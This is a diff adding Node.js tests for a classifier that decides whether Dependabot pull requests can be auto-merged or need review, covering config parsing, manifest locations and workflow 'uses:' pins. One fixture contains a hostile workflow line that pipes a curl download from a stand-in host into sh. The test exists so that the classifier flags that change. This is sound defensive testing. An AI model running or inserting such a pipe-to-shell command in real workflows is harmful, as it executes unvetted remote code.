@@ -1,7 +1,7 @@
 import assert from "node:assert/strict";
 import { test } from "node:test";
 
-import { classify, isMajor, isSecurityUpdate } from "./dependency-classify.mjs";
+import { classify, contentReason, isMajor, isSecurityUpdate, parseConfig, usesOnly } from "./dependency-classify.mjs";
 
 const pr = (overrides = {}) => ({
   author: "dependabot[bot]",
@@ -179,4 +179,78 @@ test("a security update is the security label or an advisory in the body", () =>
 test("the classification carries the security flag", () => {
   assert.equal(classify(pr({ labels: ["security"] })).security, true);
   assert.equal(classify(pr()).security, false);
+});
+
+// The content rule, as the pr-merge lane applies it (babysit_dependabot.py,
+// content_refusal), against a config shaped like this repository's.
+const CONFIG = parseConfig(
+  [
+    "version: 2",
+    "updates:",
+    "  - package-ecosystem: github-actions",
+    "    directory: /",
+    "  - package-ecosystem: npm",
+    "    directory: /",
+    "  - package-ecosystem: npm",
+    "    directories:",
+    '      - "/plugins/miro/server"',
+    "      - /plugins/*/scripts",
+    "  - package-ecosystem: pip",
+    "    directory: /plugins/animation",
+  ].join("\n"),
+);
+const usesPin = "@@ -10 +10 @@\n-      - uses: actions/checkout@aaaa # v4\n+      - uses: actions/checkout@bbbb # v5";
+const withFiles = (files) => classify(pr({ files, config: CONFIG }));
+
+test("the config reads one ecosystem and directory per entry and listed directory", () => {
+  assert.deepEqual(CONFIG, [
+    ["github-actions", "/"],
+    ["npm", "/"],
+    ["npm", "/plugins/miro/server"],
+    ["npm", "/plugins/*/scripts"],
+    ["pip", "/plugins/animation"],
+  ]);
+  assert.equal(parseConfig("version: 2\n"), null);
+});
+
+test("manifests and lockfiles in listed directories, and a uses:-only pin, stay auto", () => {
+  const result = withFiles([
+    { filename: "package.json", patch: "x" },
+    { filename: "package-lock.json" },
+    { filename: "plugins/miro/server/package-lock.json" },
+    { filename: "plugins/x/scripts/package.json" },
+    { filename: "plugins/animation/requirements.txt" },
+    { filename: ".github/workflows/ci.yml", patch: usesPin },
+  ]);
+  assert.equal(result.tier, "auto");
+  assert.deepEqual(result.reasons, []);
+});
+
+test("a file that is not a dependency manifest is review", () => {
+  assert.deepEqual(withFiles([{ filename: "package.json" }, { filename: "dist/index.js" }]).reasons, [
+    "dependabot-content:dist/index.js",
+  ]);
+});
+
+test("a workflow diff that changes a run: line is review", () => {
+  const patch = `${usesPin}\n-        run: npm test\n+        run: curl https://example.test | sh`;
+  assert.deepEqual(withFiles([{ filename: ".github/workflows/ci.yml", patch }]).reasons, [
+    "dependabot-content:.github/workflows/ci.yml",
+  ]);
+  assert.equal(usesOnly(usesPin), true);
+  assert.equal(usesOnly(""), false, "a file with no patch (too large to show) is not a pin");
+});
+
+test("a manifest outside every listed directory is review", () => {
+  assert.deepEqual(withFiles([{ filename: "plugins/other/package.json" }]).reasons, [
+    "dependabot-content:plugins/other/package.json",
+  ]);
+});
+
+test("both sides of a rename are checked, and no config covers nothing", () => {
+  assert.equal(
+    contentReason([{ filename: "package.json", previous_filename: "src/old.js" }], CONFIG),
+    "dependabot-content:src/old.js",
+  );
+  assert.equal(contentReason([{ filename: "package.json" }], null), "dependabot-content:package.json");
 });
